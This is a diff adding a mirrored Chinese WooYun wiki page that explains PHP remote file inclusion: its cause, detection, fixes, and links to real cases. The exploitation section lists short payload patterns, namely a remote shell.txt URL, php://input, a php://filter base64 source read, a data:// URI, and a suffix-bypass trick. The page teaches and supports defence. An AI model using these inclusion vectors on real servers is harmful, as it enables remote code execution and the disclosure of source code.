@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+
+<!-- Mirrored from wiki.wooyun.org/_export/xhtml/web:rfi by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:07 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="utf-8" />
+  <title>web:rfi</title>
+<meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="index,follow"/>
+<meta name="keywords" content="web,rfi"/>
+<link rel="search" type="application/opensearchdescription+xml" href="../../lib/exe/opensearch.php" title="WooYun WiKi"/>
+<link rel="start" href="../../index.html"/>
+<link rel="contents" href="../../web_rfidecf.html?do=index" title="网站地图"/>
+<link rel="alternate" type="application/rss+xml" title="最近更改" href="../../feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="../../feed4fbc.php?mode=list&amp;ns=web"/>
+<link rel="alternate" type="text/html" title="纯HTML" href="web_rfi.html"/>
+<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="../raw/rfi.txt"/>
+<link rel="canonical" href="../../web_rfi.html"/>
+<link rel="stylesheet" type="text/css" href="../../lib/exe/css70b4.css?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='web';var JSINFO = {"id":"web:rfi","namespace":"web","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="../../lib/exe/js1e16.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
+<script type="text/javascript" charset="utf-8" src="../../lib/plugins/codeprettify/google-code-prettify/run_prettifyeb11.js?lang=css"></script>
+</head>
+<body>
+<div class="dokuwiki export">
+<!-- TOC START -->
+<div id="dw__toc">
+<h3 class="toggle">目录</h3>
+<div>
+
+<ul class="toc">
+<li class="level1"><div class="li"><a href="#远程文件包含_remote_file_include">远程文件包含（Remote File Include）</a></div>
+<ul class="toc">
+<li class="clear">
+<ul class="toc">
+<li class="level3"><div class="li"><a href="#漏洞简介">1、漏洞简介</a></div></li>
+<li class="level3"><div class="li"><a href="#漏洞成因">2、漏洞成因</a></div></li>
+<li class="level3"><div class="li"><a href="#漏洞的检测及利用">3、漏洞的检测及利用</a></div></li>
+<li class="level3"><div class="li"><a href="#漏洞修复">4、漏洞修复</a></div></li>
+<li class="level3"><div class="li"><a href="#实际案例">5、实际案例</a></div></li>
+<li class="level3"><div class="li"><a href="#相关资源">6、相关资源</a></div></li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<!-- TOC END -->
+
+<h1 class="sectionedit1" id="远程文件包含_remote_file_include">远程文件包含（Remote File Include）</h1>
+<div class="level1">
+
+</div>
+<!-- EDIT1 SECTION "远程文件包含（Remote File Include）" [1-59] -->
+<h3 class="sectionedit2" id="漏洞简介">1、漏洞简介</h3>
+<div class="level3">
+<hr />
+
+<p>
+如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括<a href="../../web_lfi.html" class="wikilink1" title="web:lfi">本地文件包含</a>和远程文件包含两种形式。
+</p>
+
+</div>
+<!-- EDIT2 SECTION "1、漏洞简介" [60-303] -->
+<h3 class="sectionedit3" id="漏洞成因">2、漏洞成因</h3>
+<div class="level3">
+<hr />
+
+<p>
+文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校检被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在远程服务器上市，就形成的远程文件包含漏洞。
+</p>
+
+</div>
+<!-- EDIT3 SECTION "2、漏洞成因" [304-670] -->
+<h3 class="sectionedit4" id="漏洞的检测及利用">3、漏洞的检测及利用</h3>
+<div class="level3">
+<hr />
+
+<p>
+无通用的检测方法，但是大部分扫描器都支持远程文件包含漏洞的检测。
+</p>
+
+<p>
+以下是常用的引入远程文件的方法
+</p>
+
+<p>
+常见的协议：
+</p>
+<pre class="code">[http|https|ftp]://example.com/shell.txt</pre>
+
+<p>
+(需要allow<em>url</em>fopen=On并且 allow<em>url</em>include=On)
+</p>
+
+<p>
+利用php流input：
+</p>
+<pre class="code">php://input</pre>
+
+<p>
+需要allow<em>url</em>include=On,参考<a href="http://php.net/manual/zh/wrappers.php.php" class="urlextern" title="http://php.net/manual/zh/wrappers.php.php"  rel="nofollow">php:// — 访问各个输入/输出流（I/O streams）</a>，<a href="http://www.nowamagic.net/academy/detail/12220520" class="urlextern" title="http://www.nowamagic.net/academy/detail/12220520"  rel="nofollow">深入剖析PHP输入流 php://input</a>
+</p>
+
+<p>
+利用php流filter：
+</p>
+<pre class="code">php://filter/convert.base64-encode/resource=index.php</pre>
+
+<p>
+需要allow<em>url</em>include=On,参考<a href="http://php.net/manual/zh/wrappers.php.php" class="urlextern" title="http://php.net/manual/zh/wrappers.php.php"  rel="nofollow">php:// — 访问各个输入/输出流（I/O streams）</a>
+</p>
+
+<p>
+利用data URIs：
+</p>
+<pre class="code">data://text/plain;base64,SSBsb3ZlIFBIUAo=</pre>
+
+<p>
+(需要allow<em>url</em>include=On)
+</p>
+
+<p>
+当服务器自动给文件增加后缀时可以在url之后增加&#039;?&#039;或者&#039;#&#039;，便可绕过。
+</p>
+
+</div>
+<!-- EDIT4 SECTION "3、漏洞的检测及利用" [671-1696] -->
+<h3 class="sectionedit5" id="漏洞修复">4、漏洞修复</h3>
+<div class="level3">
+<hr />
+
+<p>
+对引入文件包含的参数进行过滤，或者对所引入的文件的域进行限制，禁止服务器访问可信域以外的文件。
+</p>
+
+</div>
+<!-- EDIT5 SECTION "4、漏洞修复" [1697-1871] -->
+<h3 class="sectionedit6" id="实际案例">5、实际案例</h3>
+<div class="level3">
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-059641" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-059641"  rel="nofollow">春秋航空某分站存在远程文件包含漏洞</a>
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-0107969" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-0107969"  rel="nofollow">爱爱医某站远程文件包含及mysql盲注</a>
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-012031" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-012031"  rel="nofollow">华为某系统文件包含漏洞</a>
+</p>
+
+</div>
+<!-- EDIT6 SECTION "5、实际案例" [1872-2186] -->
+<h3 class="sectionedit7" id="相关资源">6、相关资源</h3>
+<div class="level3">
+<hr />
+
+<p>
+<a href="http://drops.wooyun.org/tips/3827" class="urlextern" title="http://drops.wooyun.org/tips/3827"  rel="nofollow">PHP文件包含漏洞总结</a>
+</p>
+
+<p>
+<a href="http://php.net/manual/zh/wrappers.php.php" class="urlextern" title="http://php.net/manual/zh/wrappers.php.php"  rel="nofollow">php:// — 访问各个输入/输出流（I/O streams）</a>
+</p>
+
+<p>
+<a href="http://www.nowamagic.net/academy/detail/12220520" class="urlextern" title="http://www.nowamagic.net/academy/detail/12220520"  rel="nofollow">深入剖析PHP输入流 php://input</a>
+</p>
+
+</div>
+<!-- EDIT7 SECTION "6、相关资源" [2187-] --></div>
+</body>
+
+<!-- Mirrored from wiki.wooyun.org/_export/xhtml/web:rfi by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:07 GMT -->
+</html>
